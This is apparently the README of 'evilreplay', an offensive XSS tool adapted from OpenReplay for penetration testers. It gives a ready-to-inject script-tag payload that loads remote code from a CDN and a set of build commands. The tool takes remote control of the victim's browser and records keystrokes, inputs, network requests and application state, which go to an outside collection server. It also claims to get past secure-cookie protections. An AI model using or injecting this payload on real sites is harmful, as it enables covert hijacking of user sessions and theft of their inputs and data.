This tool is a weaponized adaptation of the [OpenReplay project](https://github.com/openreplay/openreplay), tailored for penetration testers and security professionals to demonstrate and assess the impact of Cross-Site Scripting (XSS) vulnerabilities in restricted environments without the need for stealing cookies.

### 🔥 Key Features

* 🎯 **Remote Browser Control**
  Interact with the victim’s browser in real time via an intuitive UI — click buttons, follow links, and simulate keystrokes remotely.

* 📹 **Automatic Session Recording**
  All victim interactions are recorded, providing replayable sessions for easier analysis and reporting of XSS findings.

* 🔍 **Deep Visibility**
  Obtain user inputs and detailed browser diagnostics:
  
  * User keyboard/mouse inputs and events
  * Console logs & JS errors
  * Network requests and responses
  * Application state and store actions
  * 40+ performance and behavior metrics

* 🛡️ **Bypasses Secure Contexts**
  Capture data even when secure cookies and modern browser protections are in place.

## Usage

The following script can be used as a XSS payload. **(don't forget to change the `projectKey`)** Follow the [Building The Payload](#Building-The-Payload) section for compiling the payload from the source. (The `ingestPoint` parameter needs to be updated when self-hosting)


```html
<script src="https://cdn.jsdelivr.net/gh/EgeBalci/evilreplay@master/evilreplay.min.js" onload=evilreplay("OEeP7C6ysFPXP8mDI04T")></script>
```

## Building The Payload

For building the `evilreplay.js` XSS payload from the souce you need to install [bun](https://bun.sh/) follow the steps below.

```
git clone https://github.com/EgeBalci/evilreplay
cd ./evilreplay/tracker/tracker-assist
bun install 
bun run build 
cd ../tracker 
bun run build 

# XSS payload is built as dist/iife/evilreplay.js
```
